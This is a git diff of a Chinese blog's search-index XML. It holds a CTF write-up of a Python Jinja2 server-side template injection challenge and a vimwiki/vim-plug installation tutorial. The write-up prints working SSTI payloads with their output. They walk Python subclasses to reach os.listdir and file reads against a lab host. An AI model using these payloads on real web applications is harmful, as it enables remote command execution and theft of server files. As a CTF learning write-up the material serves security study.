class="string">&#x27;werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.etag.ETagRequestMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.etag.ETagResponseMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.user_agent.UserAgentMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.request.StreamOnlyMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.response.ResponseStream&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.response.ResponseStreamMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.exceptions.Aborter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;uuid.UUID&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;CArgObject&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ctypes.CThunkObject&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ctypes._CData&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ctypes.CField&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ctypes.DictRemover&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ctypes.CDLL&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ctypes.LibraryLoader&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;select.epoll&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;subprocess.Popen&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itsdangerous._json._CompactJSON&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itsdangerous.signer.SigningAlgorithm&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itsdangerous.signer.Signer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itsdangerous.serializer.Serializer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itsdangerous.url_safe.URLSafeSerializerMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask._compat._DeprecatedBool&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.local.Local&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.local.LocalStack&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.local.LocalManager&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.local.LocalProxy&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ast.NodeVisitor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;difflib.HtmlDiff&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.routing.RuleFactory&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.routing.RuleTemplate&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.routing.BaseConverter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.routing.Map&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.routing.MapAdapter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click._compat._FixupStream&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click._compat._AtomicFile&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.utils.LazyFile&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.utils.KeepOpenFile&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.utils.PacifyFlushWrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.types.ParamType&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.parser.Option&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.parser.Argument&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.parser.ParsingState&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.parser.OptionParser&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.formatting.HelpFormatter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.core.Context&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.core.BaseCommand&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.core.Parameter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.signals.Namespace&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.signals._FakeSignal&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.helpers.locked_cached_property&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.helpers._PackageBoundObject&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.cli.DispatchingApp&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.cli.ScriptInfo&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.config.ConfigAttribute&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.ctx._AppCtxGlobals&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.ctx.AppContext&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.ctx.RequestContext&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.json.tag.JSONTag&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.json.tag.TaggedJSONSerializer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.sessions.SessionInterface&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.json._JSONModule&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.json.JSONMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.blueprints.BlueprintSetupState&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.serving.WSGIRequestHandler&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.ext.Extension&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.ext._CommentFinder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.serving._SSLContext&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.serving.BaseWSGIServer&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;unicodedata.UCD&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;array.array&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;method-wrapper&#x27;</span>&gt;] <span class="keyword">not</span> found</span><br></pre></td></tr></table></figure>
+
+<p>可以在其中找到 &lt;type ‘file’&gt;类型 (可以进行文件读取)，下标是40(此项前面有40个’,’)</p>
+<p><strong>还可以看到有一个 &lt;class ‘site._Printer’&gt;类型（可以进行命令执行）</strong>，下表是71，构造payload进行命令执行</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:50859/&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>回显</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">URL http://61.147.171.105:50859/[&#x27;index.py&#x27;, &#x27;fl4g&#x27;] not found</span><br></pre></td></tr></table></figure>
+
+<p>接下来构造读取flag payload</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:50859/&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;fl4g&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到flag：</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ctf</span>&#123;f22b6844-<span class="number">5169</span>-<span class="number">4054</span>-b2a0-d95b9361cb57&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>CTF_Writeup</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>攻防世界</tag>
+        <tag>SSTI</tag>
+        <tag>Writeup</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>记一次vimwiki安装及vim markDown的使用</title>
+    <url>/2023/11/24/%E8%AE%B0%E4%B8%80%E6%AC%A1vimwiki%E5%AE%89%E8%A3%85%E5%8F%8Avim-markDown%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<p>写这篇博客的缘由是我的Linux操作系统的老师布置的一项作业</p>
+<p><img data-src="https://images.gaifagafin.top/202311241242494.png"></p>
+<h1 id="vimwiki安装"><a href="#vimwiki安装" class="headerlink" title="vimwiki安装"></a>vimwiki安装</h1><p>这个是vimwiki的官方文档：<a href="https://github.com/vimwiki/vimwiki">vimwiki&#x2F;vimwiki: Personal Wiki for Vim (github.com)</a></p>
+<p>我采用的是<code>Vim packages</code>安装，查看官方文档↓</p>
+<img data-src="https://images.gaifagafin.top/202311241242416.png" style="zoom:80%;" />
+
+<h2 id="vimsrc配置"><a href="#vimsrc配置" class="headerlink" title="vimsrc配置"></a>vimsrc配置</h2><p>查看一下vim的<strong>版本</strong></p>
+<p>终端输入<code>vim -v</code>即可查看，我的版本是9.0.1378</p>
+<img data-src="https://images.gaifagafin.top/202311241242329.png" style="zoom:67%;" />
+
+<p>确认版本符合要求后要将vim的配置文件<code>vimrc</code>修改，我的vimrc文件在<code>/etc/vim/vimrc</code>，管理员权限输入</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/vim/vimrc</span><br></pre></td></tr></table></figure>
+
+<p>将这三个配置修改成如下图</p>
+<img data-src="https://images.gaifagafin.top/202311241242022.png" style="zoom:80%;" />
+
+<h2 id="下载vimwiki"><a href="#下载vimwiki" class="headerlink" title="下载vimwiki"></a>下载vimwiki</h2><p>在终端输入：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载vimwiki</span></span><br><span class="line">git clone https://github.com/vimwiki/vimwiki.git ~/.vim/pack/plugins/start/vimwiki</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">to generate documentation i.e. <span class="string">&#x27;:h vimwiki&#x27;</span></span></span><br><span class="line">vim -c &#x27;helptags ~/.vim/pack/plugins/start/vimwiki/doc&#x27; -c quit</span><br></pre></td></tr></table></figure>
+
+<p>后面的指令用来生成vimwiki的帮助文档</p>
+<h2 id="使用vimwiki"><a href="#使用vimwiki" class="headerlink" title="使用vimwiki"></a>使用vimwiki</h2><p>下载完成之后打开<code>vim</code>，在命令模式下输入<code>&lt;Leader&gt;ww</code>，此处<code>&lt;Leader&gt;</code>默认是<code>\</code>，即输入<code>\ww</code>进入即可进行vimwiki编写</p>
+<img data-src="https://images.gaifagafin.top/202311241242078.png" style="zoom: 80%;" />
+
+<h1 id="vim插件下载"><a href="#vim插件下载" class="headerlink" title="vim插件下载"></a>vim插件下载</h1><p>vimwiki是默认支持markDown格式的，但若想更方便的编辑，需下载插件。</p>
+<p><code>Vim-plug</code> 是一个Vim插件管理器，利用异步并行可以快速地安装、更新和卸载插件。</p>
+<h2 id="Vim-plug的安装"><a href="#Vim-plug的安装" class="headerlink" title="Vim-plug的安装"></a><a href="https://github.com/junegunn/vim-plug">Vim-plug</a>的安装</h2><p>输入指令(在线安装)</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -fLo ~/.vim/autoload/plug.vim --create-dirs     https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim</span><br></pre></td></tr></table></figure>
+
+<img data-src="https://images.gaifagafin.top/202311241242157.png" style="zoom:80%;" />
+
+<h2 id="插件的添加和删除"><a href="#插件的添加和删除" class="headerlink" title="插件的添加和删除"></a>插件的添加和删除</h2><p>要安装插件，你必须如下所示首先在 Vim 配置文件中声明它们。</p>
+<p>一般 Vim 的配置文件是 <code>~/.vimrc</code>(我的配置文件在 &#x2F;etc&#x2F;vim&#x2F;vimrc)，Neovim 的配置文件是 <code>~/.config/nvim/init.vim</code>。</p>
+<p>请记住，当你在配置文件中声明插件时，列表应该以 <code>call plug#begin(PLUGIN_DIRECTORY)</code> 开始，并以 <code>plug#end() </code>结束。</p>
+<p>编辑 <code>vimrc </code>文件中的内容，比如安装“lightline.vim” 插件</p>
+<figure class="highlight leaf"><table><tr><td class="code"><pre><span class="line">call plug<span class="punctuation">#</span><span class="keyword">begin</span><span class="params">(&#x27;~<span class="operator">/</span>.<span class="variable">vim</span><span class="operator">/</span><span class="variable">plugged</span>&#x27;)</span></span><br><span class="line">Plug &#x27;itchyny/lightline.vim&#x27;</span><br><span class="line">call plug<span class="punctuation">#</span><span class="keyword">end</span><span class="params">()</span></span><br></pre></td></tr></table></figure>
+
+<p>下图是我为编写markDown安装的插件：</p>
+<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">call</span> plug#begin(<span class="string">&#x27;~/.vim/plugged&#x27;</span>)</span><br><span class="line">Plug <span class="string">&#x27;godlygeek/tabular&#x27;</span></span><br><span class="line">Plug <span class="string">&#x27;plasticboy/vim-markdown&#x27;</span></span><br><span class="line">Plug <span class="string">&#x27;mzlogin/vim-markdown-toc&#x27;</span></span><br><span class="line">Plug <span class="string">&#x27;iamcco/markdown-preview.nvim&#x27;</span></span><br><span class="line"><span class="keyword">call</span> plug#end()</span><br></pre></td></tr></table></figure>
+
+<img data-src="https://images.gaifagafin.top/202311241242914.png" style="zoom:80%;" />
+
+<p><code>:w</code>保存之后在vim命令模式下输入：</p>
+<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">:PlugInstall</span><br></pre></td></tr></table></figure>
+
+<img data-src="https://images.gaifagafin.top/202311241243535.png" style="zoom:80%;" />
+
+<h2 id="报错解决"><a href="#报错解决" class="headerlink" title="报错解决"></a>报错解决</h2><p>在vim输入<code>:PlugInstall</code>后，我这里报了一个错误</p>
+<p><img data-src="https://images.gaifagafin.top/202311241243438.png"></p>
+<p>可以尝试以下解决方法：</p>
+<p>1、打开hosts</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p>2、在hosts里面添加下列内容</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">199.232.28.133 raw.githubusercontent.com</span><br></pre></td></tr></table></figure>
+
+<h2 id="安装完成"><a href="#安装完成" class="headerlink" title="安装完成"></a>安装完成</h2><img data-src="https://images.gaifagafin.top/202311241243943.png" style="zoom:80%;" />
+
+<h1 id="使用vimwiki编写markDown"><a href="#使用vimwiki编写markDown" class="headerlink" title="使用vimwiki编写markDown"></a>使用vimwiki编写markDown</h1><h2 id="使用markDown-Preview在网页预览markDown"><a href="#使用markDown-Preview在网页预览markDown" class="headerlink" title="使用markDown-Preview在网页预览markDown"></a>使用markDown-Preview在网页预览markDown</h2><p>vim打开<code>.md</code>后缀的文件，命令行输入<code>:MarkdownPreview</code>，就会在打开的浏览器中看到markDown的预览页面</p>
+<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="comment">&quot; 开启Mardown预览</span></span><br><span class="line">:MarkdownPreview</span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 关闭Mardown预览</span></span><br><span class="line">:MarkdownPreviewStop</span><br></pre></td></tr></table></figure>
+
+<img data-src="https://images.gaifagafin.top/202311241243566.png" style="zoom:80%;" />
+
+<p>注意：在<code>.wiki</code>文件中使用命令启动markDown-Preview插件会报错</p>
+<img data-src="https://images.gaifagafin.top/202311241243906.png" style="zoom:80%;" />
+
+<p>只需要将文件后缀<code>.wiki</code>改成<code>.md</code>即可</p>
+<img data-src="https://images.gaifagafin.top/202311241243194.png" style="zoom:80%;" />
+
+<hr>
+<p>参考链接：</p>
+<p> <a href="https://www.cnblogs.com/zhaodehua/articles/15108744.html">https://www.cnblogs.com/zhaodehua/articles/15108744.html</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/84773275">高效做笔记:vim + markdown - 知乎 (zhihu.com)</a></p>
+<p><a href="https://www.cnblogs.com/yutian-blogs/p/12904221.html">Linux下安装vim-plug报错：Failed to connect to raw.githubusercontent.com port 443: Connection refused - Yu_tiann - 博客园 (cnblogs.com)</a></p>
+<p><a href="https://blog.csdn.net/lxyoucan/article/details/114362756">https://blog.csdn.net/lxyoucan/article/details/114362756</a></p>
+]]></content>
+      <categories>
+        <category>Linux</category>
+        <category>Vim</category>
+      </categories>
+      <tags>
+        <tag>vimwiki</tag>
+        <tag>vim-markDown</tag>
       </tags>
   </entry>
   <entry>
@@ -2901,140 +3038,129 @@ height: 100%; left: 0; top: 0;"> </iframe></div>
       </tags>
   </entry>
   <entry>
-    <title>攻防世界-Web_python_template_injection</title>
-    <url>/2023/10/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-python-template-injection/</url>
-    <content><![CDATA[<p>第一次做模板注入的题目，参考H师傅的writeup <a href="https://blog.csdn.net/Mr_helloword/article/details/107949217">https://blog.csdn.net/Mr_helloword/article/details/107949217</a></p>
-<img data-src="https://images.gaifagafin.top/202311051131161.png" style="zoom:67%;" />
-
-<p>进入靶机网址提示</p>
-<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">python <span class="keyword">template</span> injection</span><br></pre></td></tr></table></figure>
-
-<p>知道这是一道python模板注入</p>
-<p>url输入 </p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:50859/&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>页面回显</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:50859/49 not found</span><br></pre></td></tr></table></figure>
-
-<p>判断存在SSTI注入</p>
-<p>查看网站模块，url输入</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:50859/&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>回显</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">URL http://<span class="number">61.147</span><span class="number">.171</span><span class="number">.105</span>:<span class="number">50859</span>/[&lt;<span class="built_in">type</span> <span class="string">&#x27;type&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakref&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakcallableproxy&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakproxy&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;int&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;basestring&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;list&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;NoneType&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;NotImplementedType&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;traceback&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;super&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;xrange&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;set&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;slice&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;staticmethod&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;complex&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;float&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;buffer&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;long&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;frozenset&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;property&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;memoryview&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;tuple&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;enumerate&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;reversed&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;code&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;frame&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;builtin_function_or_method&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;instancemethod&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;function&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;classobj&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dictproxy&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;generator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;getset_descriptor&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;wrapper_descriptor&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;instance&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;ellipsis&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;member_descriptor&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;file&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;PyCapsule&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;cell&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;callable-iterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;iterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.long_info&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.float_info&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;EncodingMap&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;fieldnameiterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;formatteriterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.version_info&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.flags&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;exceptions.BaseException&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;module&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;imp.NullImporter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;zipimport.zipimporter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;posix.stat_result&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;posix.statvfs_result&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Hashable&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;classmethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Iterable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Sized&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Container&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Callable&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict_keys&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict_items&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict_values&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;site._Printer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;site._Helper&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_sre.SRE_Pattern&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_sre.SRE_Match&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_sre.SRE_Scanner&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;site.Quitter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;functools.partial&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;operator.itemgetter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;operator.attrgetter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;operator.methodcaller&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;collections.deque&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;deque_iterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;deque_reverse_iterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.combinations&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.combinations_with_replacement&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.cycle&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.dropwhile&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.takewhile&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.islice&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.starmap&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.imap&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.chain&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.compress&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.ifilter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.ifilterfalse&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.count&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.izip&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.izip_longest&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.permutations&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.product&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.repeat&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.groupby&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.tee_dataobject&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.tee&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools._grouper&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_thread._localdummy&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;thread._local&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;thread.lock&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;Struct&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_json.Scanner&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span 